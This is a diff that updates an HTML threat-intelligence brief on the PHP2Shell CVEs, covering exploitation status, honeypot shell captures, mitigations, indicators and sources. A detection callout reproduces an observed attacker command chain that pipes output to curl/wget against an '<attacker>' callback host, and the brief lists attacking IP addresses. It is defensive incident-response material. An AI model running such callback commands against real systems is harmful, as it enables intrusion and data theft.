+          <tr><td>Repositories</td><td><strong>~1,000</strong></td><td>GitHub search for <code>php2shell</code> saturates the 1,000-result cap; partitioned counts give 272 created 20&ndash;21 Oct, 585 on 22&ndash;23 Oct, 137 on 24&ndash;26 Oct &mdash; more than double the 426 graded on 22 Oct</td></tr>
+          <tr><td>Most-starred artefact</td><td><code>ikow</code> 1,792★</td><td>Overtook <code>eness</code>; <code>9bie</code> at 1,436★ is the public PoC family the successful chain most resembles. New: <code>assetnote/php2shell-scanner</code> 904★ &mdash; the first high-fidelity scanner from a named research team</td></tr>
+          <tr><td>Attribution</td><td><strong>None</strong></td><td>Two source clusters, shared tooling template, no shared-control evidence. The Lazarus claim in circulation is unsupported</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p class="note">One unverified lead worth a follow-up, recorded as a lead and not a finding: <code>15.204.59.70</code> &mdash; the Episode&nbsp;A host that achieved three confirmed shells &mdash; also carries the hostnames <code>pdfkill.ai</code>, <code>panel.pdfkill.ai</code>, <code>app.pdfkill.ai</code> and <code>fake.pdfkill.ai</code> in Shodan&rsquo;s InternetDB index. On a shared OVH VPS this may be a prior tenant rather than the operator; establishing which requires certificate and historical-DNS work not done here.</p>
+  </section>
 
   <section>
     <p class="eyebrow">Update &middot; 23 October</p>
@@ -466,6 +622,22 @@
     <h3>A working exploit exists privately</h3>
     <p>VulnCheck reports holding a private, weaponised exploit for CVE-2026-109618: x86-64, ASLR enabled, <code>display_errors=Off</code>, against PHP 8.4.26. We have not verified that ourselves, and it does not contradict the public picture &mdash; it sharpens it. &ldquo;None of the public PoCs bypasses ASLR&rdquo; is a statement about <em>public</em> code, and it should not be read as &ldquo;this is not exploitable.&rdquo;</p>
     <p>Sophos, for its part, is candid that building one is hard: its own Adversary Group has attempted it, <em>&ldquo;which is proving challenging even with AI support&rdquo;</em>, and it observes that <em>&ldquo;the lack of successful exploits in the wild suggests threat actors are also struggling.&rdquo;</em> It also cautions that researcher claims may be lab-only. <strong>Urgent patching remains the recommendation.</strong></p>
+
+    <h3>Refinements later on 23 October</h3>
+    <p><strong>The private exploit got broader, and the public ones stayed narrow.</strong> VulnCheck reports its weaponised CVE-2026-109618 exploit now covers <strong>PHP 8.4.10&ndash;8.4.26 "with no modifications"</strong>, up from 8.4.26 alone by 19:00 ET on 22 October, and it works on <strong>x86-64 with ASLR enabled and <code>display_errors=off</code></strong>. On ARM64 the memory leak works but RCE is not functional and ASLR is described as brute-forceable. By contrast, of the hundreds of public repositories, <em>"only a very small number have been legitimate exploits"</em>; exactly one bypassed ASLR &mdash; on 8.4.26 with <strong>default heap configuration only</strong>, and it did not work outside that setup. That independently matches the grading on this page: three of twenty-three artefacts engaged the real mechanism.</p>
+
+    <p><strong>The mitigation ordering matters more than the settings.</strong> Rapid7 is explicit that <code>session.upload_progress.enabled=0</code> must be applied <em>before request parsing</em> &mdash; through <code>php.ini</code>, FPM or server configuration, because <code>ini_set()</code> and <code>.user.ini</code> are <strong>too late</strong> &mdash; and that every worker must then be restarted, since stale state lives in the worker, not the config. The same applies to <code>fatal_error_backtraces=0</code> on 8.5 and to an administrative <code>memory_limit=-1</code>. Do not lean on cgroup or container memory limits, or on <code>RLIMIT_AS</code>/<code>RLIMIT_DATA</code>: those are the counter-indicated paths this brief already records.</p>
+
+    <p><strong>Inventory:</strong> Rapid7 published a Velociraptor artifact, <code>Generic.Applications.PHPInventory</code>, which enumerates PHP installations and running processes across Windows, Linux and macOS &mdash; the cheapest way to find embedded runtimes that a host package manager does not manage.</p>
+
+    <div class="callout info">
+      <span class="label">An unverified claim doing the rounds &mdash; appliance exposure</span>
+      <p>A secondary summary circulating today states that <strong>Palo Alto PAN-OS and Panorama are affected</strong> through the management interface, with hotfixes due 26&ndash;30 October. <strong>Rapid7's own advisory does not mention PAN-OS, Panorama or any appliance platform</strong>, and no primary source has been located for it. It is recorded here as <em>unverified</em>, and it should not enter a patching plan until an appliance vendor publishes it. If it proves true it matters a great deal, because appliance management planes are exactly the embedded runtimes that routine PHP patching does not reach.</p>
+    </div>
+
+    <p><strong>Independent status from Rapid7:</strong> it has <em>not</em> observed exploitation in the wild, though it has multiple reports of attempts, and it expects <em>"a viable exploit is expected to be made public soon."</em> That is a third sensor operator reading attempts-but-no-success, alongside watchTowr and AWS.</p>
+
+    <p class="note">Re-checked live this run: KEV still <code>2026.10.21</code> / 1,754 entries with neither CVE present, and php.net still lists 8.5.12, 8.4.27, 8.3.36 and 8.2.35 as the latest on every branch &mdash; <strong>no further release since 21 October</strong>. The VulnCheck artifact hashes (four, including the 13-byte bodyless POST) are now in the export as retro-match material, not as AV blocks.</p>
 
     <h3>Status, checked 23 October</h3>
     <div class="scroll">
@@ -590,18 +762,18 @@
       </div>
       <div class="tile">
         <div class="k">CVE records</div>
-        <div class="v">2</div>
-        <div class="n">MITRE published 13:48 / 13:54 UTC under assigner <code>php</code>; NVD ingested 14:17 UTC, status <em>Modified</em></div>
+        <div class="v">3</div>
+        <div class="n">NVD <em>Analyzed</em> for both &mdash; 9.2 v4.0, plus v3.1 9.8 / 8.1. <strong><code>CVE-2026-115560</code> has no NVD record</strong> and no fix</div>
       </div>
       <div class="tile">
         <div class="k">In CISA KEV</div>
         <div class="v">No</div>
-        <div class="n">Catalog <code>2026.10.21</code>, 1,754 entries · re-checked 02:00 UTC, unchanged</div>
+        <div class="n">Catalog <code>2026.10.23</code>, <strong>1,756</strong> entries &middot; fetched directly 26 Oct, both CVEs still absent</div>
       </div>
       <div class="tile">
         <div class="k">Exploited in the wild</div>
-        <div class="v">Yes</div>
-        <div class="n">Hadrian: &ldquo;exploited in the wild at scale&rdquo; · six independent sensors · <strong>no confirmed compromise</strong></div>
+        <div class="v">Yes &mdash; and now successful</div>
+        <div class="n">35 Apache-parent shells, PCAP + process-tree correlation, 24 Oct · <strong>still no confirmed victim compromise</strong> &mdash; both claims withdrawn</div>
       </div>
       <div class="tile">
         <div class="k">Public exploit</div>
@@ -610,13 +782,13 @@
       </div>
       <div class="tile">
         <div class="k">Repositories</div>
-        <div class="v">379</div>
-        <div class="n">from 35 on 21 Oct morning · the two most-starred projects both self-corrected after the patch</div>
+        <div class="v">~1,000</div>
+        <div class="n">from 35 on 21 Oct · search saturates GitHub&rsquo;s 1,000 cap; 137 created 24&ndash;26 Oct alone</div>
       </div>
       <div class="tile">
         <div class="k">&nbsp;</div>
         <div class="v" style="font-size:15px;">Detection is behavioural</div>
-        <div class="n">no network IOCs exist: hunt OOM fatals, oversized <code>PHPSESSID</code> response cookies, worker churn</div>
+        <div class="n">hunt OOM fatals, 819,200-byte <code>PHPSESSID</code> <em>response</em> cookies, shells parented by <code>apache2</code> as <code>uid=33</code></div>
       </div>
       <div class="tile">
         <div class="k">PHP hosts on Shodan</div>
@@ -629,8 +801,8 @@
 
   <section>
     <p class="eyebrow">Exploitation status</p>
-    <h2>Exploited at scale &mdash; with no confirmed compromise</h2>
-    <p>This is the part that changed overnight. On 21 October the question was whether anyone was using this; on 22 October it is what they are achieving.</p>
+    <h2>Exploited at scale &mdash; and now exploited successfully, on a host built for it</h2>
+    <p>On 21 October the question was whether anyone was using this. On 22 October it was what they were achieving. On 24 October the first capture of a shell answered that, and on 25 October the second of the case&rsquo;s two victim-compromise claims was withdrawn. Rows updated 26 October are marked.</p>
     <div class="scroll">
       <table>
         <thead>
@@ -640,18 +812,18 @@
           <tr><td>Is it being exploited?</td><td><span class="chip chip-crit">Yes &mdash; at scale</span></td><td>Hadrian: &ldquo;We are now seeing php2shell exploited in the wild at scale.&rdquo; Six independent sensor operators reported attempts within hours of the patch.</td></tr>
           <tr><td>Who observed it</td><td><span class="chip chip-ok">Six independent</span></td><td>Cloudflare (pre-patch, CTO Dane Knecht), Hadrian, Patchstack, Vega, watchTowr (own sensors), Sansec. Vega ties its attempts to a publicly available PoC.</td></tr>
           <tr><td>Which path is being used</td><td><span class="chip chip-warn">109619 / session</span></td><td>Hadrian: &ldquo;Most of the attacks we observe abuse PHP&rsquo;s session upload-progress path.&rdquo; The session route is the cheapest to reach, not the only one.</td></tr>
-          <tr><td>Has anyone succeeded?</td><td><span class="chip chip-ok">None confirmed</span></td><td>watchTowr&rsquo;s Jake Knott: &ldquo;Whilst nobody has been successful to date, we don&rsquo;t expect that will last long.&rdquo; No victim, no ransom, no exfiltration has been attributed to this pair.</td></tr>
-          <tr><td>CISA KEV</td><td><span class="chip chip-ok">Not listed</span></td><td>Catalog <code>2026.10.21</code>, 1,754 entries, verified directly at 02:00 UTC.</td></tr>
-          <tr><td>Public IOCs</td><td><span class="chip chip-ok">None</span></td><td>ThreatFox, OTX and URLhaus return zero for both IDs (re-checked 02:00 UTC). Wiz publishes behavioural signals only.</td></tr>
-          <tr><td>Threat-actor attribution</td><td><span class="chip chip-ok">None</span></td><td>Opportunistic, not attributed. The sensors describe volume, not a campaign.</td></tr>
+          <tr><td>Has anyone succeeded? <span class="chip chip-warn">updated 26 Oct</span></td><td><span class="chip chip-crit">Yes &mdash; exploitation</span> <span class="chip chip-ok">No &mdash; victim</span></td><td>A honeypot operator captured <strong>35 shells parented by <code>apache2</code></strong> with packet and process-tree evidence on 24 October. Against a disposable honeypot configured single-worker, 128&nbsp;MiB, PHP 8.4.26 &mdash; <strong>not a victim compromise</strong>. The two victim claims (Sophos 22 Oct, Unit&nbsp;42 25 Oct) were both withdrawn.</td></tr>
+          <tr><td>CISA KEV <span class="chip chip-warn">updated 26 Oct</span></td><td><span class="chip chip-ok">Not listed</span></td><td>Catalog <code>2026.10.23</code>, <strong>1,756</strong> entries, fetched directly 26 October.</td></tr>
+          <tr><td>Public IOCs <span class="chip chip-warn">updated 26 Oct</span></td><td><span class="chip chip-crit">Yes &mdash; many</span></td><td>Threat feeds still return zero, but telescope and honeypot operators now publish source addresses, dropper URLs and four malware hashes &mdash; see the indicators section and the 26 October update. <strong>The feeds&rsquo; silence was always a coverage statement.</strong></td></tr>
+          <tr><td>Threat-actor attribution</td><td><span class="chip chip-ok">None</span></td><td>Two source-address clusters sharing a tooling template; shared tooling does not establish shared control. A &ldquo;Lazarus&rdquo; claim in circulation is unsupported and excluded.</td></tr>
           <tr><td>Regulatory posture</td><td><span class="chip chip-warn">Widening</span></td><td>CERT-EU 2026-018, Australian ACSC, NCSC-NL, and an NSA advisory on 21 October. The NSA text returned HTTP 403 from this network and is recorded as unexecuted, not as verified.</td></tr>
           <tr><td>Defensive actions</td><td><span class="chip chip-warn">Reported</span></td><td>The Record: &ldquo;hundreds of websites&rdquo; offline pre-patch, several governments removing sites, Nintendo the only organisation named.</td></tr>
         </tbody>
       </table>
     </div>
     <div class="callout">
-      <span class="label">Reading &ldquo;at scale&rdquo; without overclaiming</span>
-      <p>Six sensors seeing attempts is strong evidence that scanning and PoC replay are widespread. It is <em>not</em> evidence of a working exploit in general circulation: watchTowr, which runs dedicated honeypots, still reports no success. The most likely picture is automated probing with the public tooling, meeting mostly patched or non-vulnerable targets, with success rate unknown.</p>
+      <span class="label">Reading &ldquo;at scale&rdquo; without overclaiming &mdash; revised 26 October</span>
+      <p>Six sensors seeing attempts is strong evidence that scanning and PoC replay are widespread. As of 23 October it was <em>not</em> evidence of a working exploit in general circulation. As of 24 October it partly is: the honeypot capture proves public-class tooling reaches a shell, <strong>but only on targets matching the exploit&rsquo;s preconditions</strong> &mdash; one worker, low <code>memory_limit</code>, <code>session.upload_progress</code> on. The picture is therefore automated probing with working tooling against a population in which most production deployments do not match the profile. Success rate against <em>real</em> estates remains unknown, and Hunt.io&rsquo;s 123-target sample with zero successes is the best available lower bound on how hard this is.</p>
       <p>The earlier unsourced claim from <em>The News</em> &mdash; that Cloudflare had confirmed active exploitation &mdash; has been overtaken by events and was, in substance, closer to right than the four negative trackers suggested. It was still wrong to carry on that evidence at the time. Volume of reporting is not the same as quality of evidence, but here the reporting arrived before the evidence.</p>
     </div>
   </section>
@@ -669,6 +841,18 @@
         <div class="code-cap">Grep every PHP error log, FPM pool log and LiteSpeed STDERR sink for this shape</div>
       </div>
       <p>Two cautions. This fires on legitimate traffic too — a large upload against a tight <code>memory_limit</code> is exactly the benign case — so baseline it and alert on rate and clustering rather than on single events. And if you have already applied <code>memory_limit=-1</code> as a stopgap, you have blinded this signal: prefer the patched release over the stopgap precisely because the stopgap costs you your best detector.</p>
+    </div>
+
+    <div class="callout ok">
+      <span class="label">Added 26 October &mdash; the one signal that is not a heuristic</span>
+      <p>Everything above is a proxy: OOM fatals fire on benign uploads, oversized cookies can be app behaviour, worker crashes happen. <strong>A shell process whose parent is the web server is not a proxy.</strong> The confirmed capture found it by joining Apache worker PIDs to kernel process events, and it looks like this:</p>
+      <div class="code">
+        <button type="button" data-copy>Copy</button>
+        <pre><code>apache2 -&gt; /bin/sh   uid=33   parent.binary=/usr/sbin/apache2
+/bin/sh -&gt; id | php -r ... | curl http://&lt;attacker&gt;/pwn-&lt;host&gt; | wget -q -O- ...</code></pre>
+        <div class="code-cap">Any shell, interpreter or downloader spawning under apache2/httpd/php-fpm/lsphp as www-data is the finding, not the evidence of one</div>
+      </div>
+      <p>Hunt it on process parentage, not command text: the observed commands changed between <code>id</code>, PHP CLI, <code>curl</code> and <code>wget</code>, and later embedded <code>$(id -un)</code>/<code>$(hostname)</code>/<code>$(uname -m)</code> so that each callback identified its victim. Also note what the capture showed about <em>absence</em>: the successful final request often leaves <strong>no completed Apache access-log line</strong>, because the worker segfaults after starting the shell. An HTTP 200 on the earlier stages means nothing, and a missing log line is not a missing attack.</p>
     </div>
 
     <h3>The request itself, for the CVE-2026-109618 chain</h3>
@@ -829,6 +1013,7 @@ find /var/lib/php/sessions -name 'sess_*' -mtime -1 -user www-data -type f</code
   <section>
     <p class="eyebrow">Indicators</p>
     <h2>IOCs exist &mdash; in honeypot telemetry, not in threat feeds</h2>
+    <p class="note"><strong>Superseded in part, 26 October.</strong> The eleven addresses below were the complete public set on 22&ndash;23 October and remain the only ones with per-entity verdicts and enrichment. A larger set &mdash; telescope and honeypot telemetry, dropper URLs, payload hashes, request-body digests &mdash; is in <a href="#update-26">the 26 October update</a>. Those are leads, not graded blocklist rows, and the CSV export has not been regenerated for them.</p>
     <div class="callout crit">
       <span class="label">Correction to every earlier revision of this brief</span>
       <p>This section previously said there were no IOCs. <strong>That was wrong</strong>, and the reason it was wrong is worth keeping: we queried threat-intelligence <em>feeds</em> &mdash; ThreatFox, OTX, URLhaus &mdash; and they returned zero, because they index malicious infrastructure and published blocklists. They do not index <em>attacking hosts observed by canary and honeypot operators</em>. Two such operators published concrete indicators on 21 October: <a href="https://www.vulncheck.com/blog/php2shell-vulnerabilities">VulnCheck Canary</a> and <a href="https://aws.amazon.com/blogs/security/amazon-threat-intelligence-identifies-php2shell-exploitation-prior-to-public-disclosure-in-madpot/">Amazon Threat Intelligence (MadPot)</a>. Both re-checked at 02:30 UTC: ThreatFox still returns <code>no_result</code> for the addresses as well as for the CVE IDs &mdash; the feeds have nothing on these hosts either.</p>
@@ -1614,7 +1799,7 @@ if (isset($_GET['page'])) { include($_GET['page']); }</code></pre>
       <li><span class="src-title"><a href="https://cert.europa.eu/publications/security-advisories/2026-018">CERT-EU Security Advisory 2026-018</a></span><span class="src-meta">Primary · government CERT · no technical details, isolation guidance</span></li>
       <li><span class="src-title"><a href="https://www.bleepingcomputer.com/news/security/php-warns-admins-of-two-critical-flaws-emergency-patches-coming-tomorrow/">BleepingComputer — PHP warns admins of two critical flaws</a></span><span class="src-meta">Reporting · leak timeline, watchTowr confirmation</span></li>
       <li><span class="src-title"><a href="https://arstechnica.com/security/2026/10/php-maintainers-tell-web-devs-to-prepare-themselves-for-critical-security-patches/">Ars Technica — PHP plans emergency patches</a></span><span class="src-meta">Reporting · exposure estimates, PHP2Shell target list</span></li>
-      <li><span class="src-title"><a href="https://watchtowr.com/intelligence/php-cve-2026-109618-faq/">watchTowr — PHP RCE FAQ</a></span><span class="src-meta">Vendor · reproduced -109618, no ITW, not in KEV</span></li>
+      <li><span class="src-title"><a href="https://watchtowr.com/intelligence/php-remote-code-execution-php2shell/">watchTowr — PHP2Shell RCE</a></span><span class="src-meta">Vendor · <strong>now states it reproduced <em>both</em> CVEs</strong> (upgraded from the earlier media-relayed single-CVE claim) and observed exploitation of both in the wild; no IOCs, no counts</span></li>
       <li><span class="src-title"><a href="https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities">Huntress — Rapid Response: php2shell</a></span><span class="src-meta">Vendor · no ITW in partner telemetry, process-lineage guidance</span></li>
       <li><span class="src-title"><a href="https://sansec.io/research/php2shell">Sansec — Critical PHP RCE</a></span><span class="src-meta">Vendor · PHP2Shell screenshot, 15-minute exploitation forecast, mitigations</span></li>
       <li><span class="src-title"><a href="https://mallory.ai/blog/php-rce-rapid-response">Mallory — PHP RCE in 8.5 and earlier</a></span><span class="src-meta">Analysis · per-branch exposure table, php-src commit review</span></li>
@@ -1628,7 +1813,20 @@ if (isset($_GET['page'])) { include($_GET['page']); }</code></pre>
       <li><span class="src-title"><a href="https://jackalsyn.com/posts/php-up-2026.html">jackalsyn.com — PHP-UP-2026 (Model A, exploit bundle)</a></span><span class="src-meta">Self-published research · unverified, hash mismatch</span></li>
       <li><span class="src-title"><a href="https://github.com/19h/CVE-2026-109618">19h/CVE-2026-109618 (Model B, lab-reproduced chain)</a></span><span class="src-meta">Self-published research · local Docker only, needs app sink</span></li>
       <li><span class="src-title"><a href="https://github.com/php/php-src/pull/22113">php-src PR #22113 — prevent creation of fixed sid in php_session_rfc1867</a></span><span class="src-meta">Primary · open since 2026-05-21, matches Model B P1</span></li>
-      <li><span class="src-title"><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">CISA KEV catalog</a></span><span class="src-meta">Primary · catalog 2026.10.20, 1,754 entries, neither CVE present</span></li>
+      <li><span class="src-title"><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">CISA KEV catalog</a></span><span class="src-meta">Primary · catalog <strong>2026.10.23, 1,756 entries</strong>, neither CVE present — fetched directly 26 Oct</span></li>
+      <li><span class="src-title"><a href="https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md">phpot — PHP2Shell exploitation observed: packet-to-process RCE evidence (24 Oct)</a></span><span class="src-meta">Primary observation · <strong>35 Apache-parent <code>/bin/sh</code> starts matched to 35 complete execution-stage POSTs</strong>, PCAP + Tetragon, three targets, sources <code>15.204.59.70</code> and <code>162.35.99.94</code>. Single operator, raw data published</span></li>
+      <li><span class="src-title"><a href="https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-22-to-24-initial-attempts.md">phpot — initial exploitation attempts, 22&ndash;24 Oct</a></span><span class="src-meta">Primary observation · 30 pre-script OOMs from 13 IPs, 11 worker crashes, no RCE in that window — the attempt-only baseline the 24 Oct report is measured against</span></li>
+      <li><span class="src-title"><a href="https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/">Unit 42 — Threat Brief, updated 25 Oct</a></span><span class="src-meta">Vendor · European-government intrusion described 23 Oct, <strong>causal link to these CVEs retracted 25 Oct</strong>; agentic-AI delimiters; Cortex Xpanse 22.6M exposed</span></li>
+      <li><span class="src-title"><a href="https://security.paloaltonetworks.com/CVE-2026-109618">Palo Alto Networks advisory 047910</a></span><span class="src-meta">Primary · PAN-OS/Panorama management web UI affected · <strong>8.7, availability-only (<code>VA:H</code>, <code>VC:N/VI:N</code>)</strong> · hotfix dates per branch</span></li>
+      <li><span class="src-title"><a href="https://www.theregister.com/security/2026/10/23/theres-a-third-php2shell-bug-but-it-wont-get-an-emergency-fix/5305208">The Register — there&rsquo;s a third PHP2Shell bug</a></span><span class="src-meta">Reporting · 23 Oct 21:04 UTC · CVE-2026-115560 conditions, PHP Foundation position (Elizabeth Barron), no emergency fix</span></li>
+      <li><span class="src-title"><a href="https://vu.co.uk/blog/who-has-patched-php">Vu Agency — who has patched PHP2Shell? (~1M sites)</a></span><span class="src-meta">Independent measurement · 22&ndash;23 Oct · <strong>24% on a fixed release, +23% Hostinger inferred</strong>; CloudLinux/Plesk backports keep old version strings</span></li>
+      <li><span class="src-title"><a href="https://php2shell.delftintellab.com/">Delft Threat Intelligence Lab — live PHP2Shell telemetry</a></span><span class="src-meta">Telescope · updated 26 Oct 01:59 UTC · <strong>40,848 requests / 561 IPs / 263 ASNs / 67 countries</strong>, 168 IPs delivering code; dropper URLs and four sample hashes</span></li>
+      <li><span class="src-title"><a href="https://www.cisa.gov/news-events/alerts/2026/10/21/critical-vulnerabilities-php-require-immediate-patching">CISA — Critical vulnerabilities in PHP require immediate patching</a></span><span class="src-meta">Government alert · 21 Oct, revised 23 Oct (+ SIGMA rule) · advises offline for unpatched 8.1-and-earlier</span></li>
+      <li><span class="src-title"><a href="https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4630238/nsa-advisory-critical-patches-recommended-for-php-vulnerabilities/">NSA — Critical patches recommended for PHP vulnerabilities</a></span><span class="src-meta">Government alert · 21 Oct · inventory, prioritise, log, replace EOL, offline if patching not feasible</span></li>
+      <li><span class="src-title"><a href="https://www.covertswarm.com/post/php2shell-moving-beyond-a-lab-proof-of-concept-to-code-execution-with-aslr-enabled">CovertSwarm — ASLR-enabled execution (AArch64)</a></span><span class="src-meta">Independent lab · execution on 8.5.11, <strong>no execution on 8.5.12 controls</strong> — bears on but does not settle the patch-bypass claim; exploit not released</span></li>
+      <li><span class="src-title"><a href="https://www.securityweek.com/mirai-botnet-operators-join-php2shell-attacks-as-aslr-bypass-exploits-emerge/">SecurityWeek — Mirai operators join, ASLR bypass emerges</a></span><span class="src-meta">Reporting · 23 Oct · Hunt.io 123 targets / zero successes; SOCRadar one-click chain and its failed screen; Qualys EOL exposure; Sansec walk-back</span></li>
+      <li><span class="src-title"><a href="https://oracle.com/security-alerts/alert-cve-2026-109618.html">Oracle — Security Alert for CVE-2026-109618</a></span><span class="src-meta">Vendor · 25 Oct · <strong>HTTP 403 from this network — read only via secondary summary, recorded as unexecuted</strong></span></li>
+      <li><span class="src-title"><a href="https://www.qnap.com/en/security-news/2026/qnap-statement-on-critical-php-vulnerabilities-php2shell-assessment-and-mitigation-guidance">QNAP — statement and mitigation guidance</a></span><span class="src-meta">Vendor · QSA-26-18 · firmware 24 Oct · EOS Download Station and PHP extensions app will not be fixed</span></li>
       <li><span class="src-title"><a href="https://thehackernews.com/2026/10/php2shell-two-unpatched-critical-php.html">The Hacker News — PHP2Shell: Two Unpatched Critical PHP RCE Flaws</a></span><span class="src-meta">Reporting · 403 from this environment, so read only via search summary — recorded as unexecuted, not verified</span></li>
       <li><span class="src-title"><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2556842">Red Hat Bugzilla 2556842 — CVE-2026-109618 &amp; CVE-2026-109619</a></span><span class="src-meta">Primary · Fedora tracking bug, status NEW, severity medium, last change 06:14 UTC 21 Oct</span></li>
       <li><span class="src-title"><a href="https://github.com/Zer061/CVE-2026-109618/blob/main/VALIDATION.md">VALIDATION.md — bundle validation document (mirror)</a></span><span class="src-meta">Self-published · line-level claims, "conceptually validated", ASAN in progress</span></li>
@@ -1642,7 +1840,7 @@ if (isset($_GET['page'])) { include($_GET['page']); }</code></pre>
       <li><span class="src-title"><a href="https://github.com/php/php-src/blob/PHP-8.4/ext/standard/var_unserializer.re">php-src <code>var_unserializer.re</code> (our own verification)</a></span><span class="src-meta">Primary · <code>var_destroy</code> :242–246 / :308, reuse branch :77–80, <code>var_push</code> :118 / :132; same logic confirmed in <code>PHP-8.2</code> :63 and <code>PHP-7.2</code> :37</span></li>
       <li><span class="src-title"><a href="https://calif.io/research/php-uaf">calif.io — PHP unserialize var_hash UAF (MADBugs)</a></span><span class="src-meta">Primary · the leaker's own write-up · missing <code>BG(serialize_lock)++</code>, no CVE assigned, PHP 8.5.5, 2,375-request remote demo</span></li>
       <li><span class="src-title"><a href="https://github.com/php/php-src/blob/PHP-8.4/Zend/zend_interfaces.c">php-src <code>Zend/zend_interfaces.c</code> (our own verification)</a></span><span class="src-meta">Primary · <code>zend_user_unserialize()</code> :442–461 and <code>PHP-8.2</code> :438 checked at 13:35 UTC — no <code>BG(serialize_lock)</code> in either</span></li>
-      <li><span class="src-title"><a href="https://github.com/NCSC-NL/php2shell">NCSC-NL — php2shell (TLP:CLEAR)</a></span><span class="src-meta">Government CERT · mirrors CERT-EU; no indication of active exploitation; "large-scale exploitation likely in the short term"</span></li>
+      <li><span class="src-title"><a href="https://github.com/NCSC-NL/php2shell">NCSC-NL — php2shell (TLP:CLEAR)</a></span><span class="src-meta">Government CERT · <strong>now a machine-readable product list: ~750 products at 23 Oct — 109 fixed, 220 vulnerable, 389 investigating, 30 unaffected</strong>; SPDX-sourced, TLP:CLEAR</span></li>
       <li><span class="src-title"><a href="https://github.com/9bie/php2shell-bypass-aslr-exp">9bie/php2shell-bypass-aslr-exp — HTTP-only exploit</a></span><span class="src-meta">Self-published · claims pre-auth RCE on 8.4.26 + mod_php; unverified, needs <code>display_errors=1</code></span></li>
       <li><span class="src-title"><a href="https://www.thenews.com.pk/latest/1420771-critical-php-security-vulnerabilities-how-to-fix-them">The News — Critical PHP security vulnerabilities</a></span><span class="src-meta">Reporting · 21 Oct · sole source of an in-the-wild exploitation claim; no Cloudflare report linked, contradicted by four primary trackers</span></li>
       <li><span class="src-title"><a href="https://www.bleepingcomputer.com/news/security/php-ships-emergency-patches-for-critical-php2shell-flaws/">BleepingComputer — PHP ships emergency patches for critical PHP2Shell flaws</a></span><span class="src-meta">Reporting · 21 Oct 10:07 ET · Cloudflare's Dane Knecht on early attacks; discovery credited to Calif, Wiz and OpenAI; Banyard on mitigations</span></li>
@@ -1657,7 +1855,8 @@ if (isset($_GET['page'])) { include($_GET['page']); }</code></pre>
 
   <footer>
     <p>Compiled 2026-10-21 03:55 UTC; revised 04:55, 06:55, 07:15, 09:10, 13:35, 14:05 and 15:25 UTC on 21 October; revised and restructured at 02:00 UTC on 22 October. Sources are public reporting and direct measurement. TLP:CLEAR — all underlying reporting is public. Every negative result and failed check in this document is deliberate: an unexecuted query is recorded as unknown, not as clean.</p>
-    <p>Re-validated against the official advisory at 14:05 UTC on 21 October and again at 02:00 UTC on 22 October. The retired models and the revision log are preserved unedited in Appendices A and B — where either disagrees with the main section, the main section is correct. Two corrections in this document are to its own earlier readings rather than to the sources: the discovery credit, and the claim that the leaked bundle was aimed at the wrong subsystem throughout.</p>
+    <p>Re-validated against the official advisory at 14:05 UTC on 21 October, 02:00 UTC on 22 October, and again on 26 October against the KEV catalog, the NVD API, the PHP release API and the Palo Alto advisory. The retired models and the revision log are preserved unedited in Appendices A and B — where either disagrees with the main section, the main section is correct. Four corrections in this document are to its own earlier readings rather than to the sources: the discovery credit, the claim that the leaked bundle was aimed at the wrong subsystem throughout, the “no IOCs” position, and the PAN-OS item it recorded as unverified on 23 October and which is now confirmed by the vendor.</p>
+    <p><strong>What has not changed across five days of revision:</strong> patch to 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35, restart every worker, keep <code>session.upload_progress.enabled=0</code> in place after patching, and hunt process parentage rather than request signatures. Everything that moved — the root-cause dispute, the retractions, the new CVE, the appliance exposure, the indicator set — moved around that core.</p>
   </footer>
 
 </div>
